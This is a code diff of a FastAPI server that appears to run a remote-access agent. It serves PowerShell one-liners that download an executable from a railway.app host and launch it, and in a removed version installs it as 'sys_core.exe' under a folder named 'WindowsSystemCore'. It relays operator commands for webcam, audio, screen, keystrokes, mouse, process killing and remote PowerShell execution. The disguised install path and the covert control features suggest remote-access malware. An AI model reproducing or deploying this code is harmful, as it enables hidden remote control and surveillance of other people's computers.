@@ -19,9 +19,21 @@ app = FastAPI()
 @app.get("/api/script")
 async def get_script():
     try:
-        with open("installer.ps1", "r", encoding="utf-8") as f:
-            content = f.read()
-        return Response(content=content, media_type="text/plain")
+        # Serve the modern installer.ps1
+        if os.path.exists("installer.ps1"):
+            with open("installer.ps1", "r", encoding="utf-8") as f:
+                return Response(content=f.read(), media_type="text/plain")
+        
+        # Fallback to a generated bootstrap if file is missing
+        ps1 = f"""
+$server = "https://web-production-d6db5.up.railway.app"
+$target = "$env:TEMP\\mrl_agent.exe"
+Write-Host "--- MRL AGENT BOOTSTRAP ({AGENT_VERSION}) ---" -ForegroundColor Cyan
+Write-Host "[BOOT] Downloading core from $server..."
+Invoke-WebRequest -Uri "$server/api/agent.exe" -OutFile $target -UseBasicParsing
+Start-Process $target
+"""
+        return Response(content=ps1, media_type="text/plain")
     except Exception as e:
         return Response(content=f"Write-Host 'Error: {e}'", media_type="text/plain", status_code=500)
 
@@ -175,40 +187,9 @@ async def get_index():
     with open("index.html", "r", encoding="utf-8") as f:
         return f.read()
 
-@app.get("/api/script")
-def get_script():
-    ps1 = f"""
-$exeUrl = "https://web-production-d6db5.up.railway.app/api/client_exe"
-$targetDir = "$env:APPDATA\\WindowsSystemCore"
-$targetExe = "$targetDir\\sys_core.exe"
-$backupExe = "$targetDir\\sys_core_old.exe"
-
-# --- Aggressive Termination ---
-taskkill /F /IM sys_core.exe /T 2>$null
-taskkill /F /IM mrl_agent.exe /T 2>$null
-Start-Sleep -Seconds 3
-
-# --- File Lock Bypass Sequence ---
-if (Test-Path -Path $targetExe) {{
-    Remove-Item -Path $backupExe -Force -ErrorAction SilentlyContinue 
-    Move-Item -Path $targetExe -Destination $backupExe -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $targetExe -Force -ErrorAction SilentlyContinue
-}}
-
-if (-not (Test-Path -Path $targetDir)) {{ New-Item -ItemType Directory -Path $targetDir -Force }}
-
-Write-Host "Downloading Core Engine... Please wait (~90MB)" -ForegroundColor Cyan
-Invoke-WebRequest -Uri $exeUrl -OutFile $targetExe -UseBasicParsing -ErrorAction Stop
-
-Write-Host "Initializing Bootloader Sequence..." -ForegroundColor Green
-Start-Process -FilePath $targetExe
-"""
-    return Response(content=ps1, media_type="text/plain")
-
 @app.get("/api/client_exe")
-async def get_client_exe():
-    with open("mrl_agent.exe", "rb") as f:
-        return Response(content=f.read(), media_type="application/octet-stream")
+async def get_client_exe_old():
+    return await get_agent_exe()
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
@@ -250,7 +231,7 @@ async def websocket_endpoint(websocket: WebSocket):
                     if cid in CANDIDATE_CACHE:
                         for cand in CANDIDATE_CACHE[cid]:
                             await websocket.send_text(orjson.dumps({"t": "rtc_ice", "candidate": cand}).decode())
-                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "select_monitor", "toggle_webcam", "set_quality", "set_fps", "ws_request", "ws_stop", "ws_select_monitor", "ws_toggle_webcam", "mm", "mc", "kd", "ku", "select_camera", "toggle_audio", "ws_ps_execute", "ps_output"):
+                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "select_monitor", "toggle_webcam", "set_quality", "set_fps", "ws_request", "ws_stop", "ws_select_monitor", "ws_toggle_webcam", "ws_control", "ws_ps_execute", "mm", "mc", "kd", "ku", "select_camera", "toggle_audio", "ps_output"):
                     target = PORTAL_TO_CLIENT.get(websocket)
                     if target:
                         print(f"[RELAY] Portal -> Client ({target}): {event['t']}")
@@ -286,30 +267,9 @@ async def websocket_endpoint(websocket: WebSocket):
     except Exception as e:
         manager.disconnect(websocket)
 
-@app.get("/api/script")
-async def get_bootstrap_script():
-    ps_script = f"""
-Write-Host "--- MRL AGENT BOOTSTRAP ({AGENT_VERSION}) ---" -ForegroundColor Cyan
-$dest = "$HOME\\Desktop\\mrl_agent.exe"
-$url = "https://web-production-d6db5.up.railway.app/api/download"
-
-# Install Dependencies with visible progress
-Write-Host "[SETUP] Verifying Python environment (this may take a minute)..."
-pip install aiortc orjson mss pynput psutil opencv-python numpy requests av
-
-Write-Host "[SETUP] Downloading agent binary..."
-Invoke-WebRequest -Uri $url -OutFile $dest
-Write-Host "[BOOT] Launching agent..."
-Start-Process $dest
-"""
-    return Response(content=ps_script, media_type="text/plain")
-
 @app.get("/api/download")
-@app.get("/api/client_exe")
-async def download_agent():
-    if not os.path.exists("mrl_agent.exe"):
-        return Response(content="Agent binary is rebuilding. Please use your existing mrl_agent.exe.", status_code=503)
-    return FileResponse("mrl_agent.exe", filename="mrl_agent.exe")
+async def download_agent_api():
+    return await get_agent_exe()
 
 app.mount("/recordings", StaticFiles(directory=RECORDINGS_DIR), name="recordings")
 app.mount("/", StaticFiles(directory=".", html=True), name="static")
